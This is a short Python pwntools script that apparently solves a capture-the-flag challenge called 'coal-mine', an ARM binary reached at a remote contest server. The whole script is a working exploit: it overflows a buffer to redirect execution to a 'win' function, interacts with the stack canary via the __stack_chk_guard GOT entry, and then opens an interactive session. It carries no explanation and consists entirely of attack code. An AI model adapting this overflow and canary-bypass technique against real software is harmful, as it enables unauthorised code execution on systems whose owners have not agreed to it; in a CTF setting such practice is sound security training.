from pwn import *
context.log_level = 'debug'
context.arch = 'arm'
e = ELF('./coal-mine')
#r = gdb.debug('./coal-mine', 'c')
#r = process('./coal-mine')
r = remote('chal.nbctf.com', 30178)
r.sendline(b'3')
r.sendline(b'a'*(0x44-16-4)+p32(e.sym['win']))
r.sendline(b'1')
r.sendline(str(e.got['__stack_chk_guard']).encode())
r.sendline(b'2')
r.sendline(b'2')
r.sendline(b'8')
r.sendline(b'4')
r.interactive()


